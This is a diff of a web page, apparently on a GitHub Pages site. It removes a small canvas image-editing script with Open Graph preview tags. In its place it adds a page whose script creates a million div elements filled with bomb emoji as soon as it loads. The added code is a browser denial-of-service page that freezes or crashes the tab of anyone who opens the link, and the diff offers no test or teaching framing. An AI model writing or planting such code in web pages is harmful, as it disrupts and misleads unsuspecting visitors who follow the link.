@@ -1,50 +1,13 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta property="og:title" content="Edited Image Preview">
-  <meta property="og:description" content="An image that was edited with JavaScript.">
-  <meta property="og:image" content="https://siratsami.github.io/edited-image.png">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://siratsami.github.io/index.html">
-  <title>Image Editor</title>
-</head>
-<body>
-  <canvas id="canvas"></canvas>
-  <script>
-    const img = new Image();
-    img.crossOrigin = 'Anonymous'; // Important for editing image from another domain
-    img.onload = () => {
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
-
-      // Resize the image
-      const width = 300;
-      const height = 300;
-
-      canvas.width = width;
-      canvas.height = height;
-
-      // Draw scaled image
-      ctx.drawImage(img, 0, 0, width, height);
-
-      // OPTIONAL: Pixel manipulation
-      let imageData = ctx.getImageData(0, 0, width, height);
-      let data = imageData.data;
-      for (let i = 0; i < data.length; i += 4) {
-        // Invert colors
-        data[i] = 255 - data[i];     // Red
-        data[i+1] = 255 - data[i+1]; // Green
-        data[i+2] = 255 - data[i+2]; // Blue
-      }
-      ctx.putImageData(imageData, 0, 0);
-
-      // Save to image (you’ll need this file to be accessible by Slack)
-      const editedUrl = canvas.toDataURL('image/png');
-
-      // OPTIONAL: Send edited image to a server to save it as a file.
-    };
-    img.src = 'https://siratsami.github.io/edited-image.png';
-  </script>
-</body>
-</html>
+<style>
+  div::before {
+    content: attr(data);
+  }
+</style>
+<div data="💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣💣"></div>
+<script>
+  for (let i = 0; i < 1e6; i++) {
+    let e = document.createElement('div');
+    e.setAttribute('data', '💣'.repeat(100));
+    document.body.appendChild(e);
+  }
+</script>
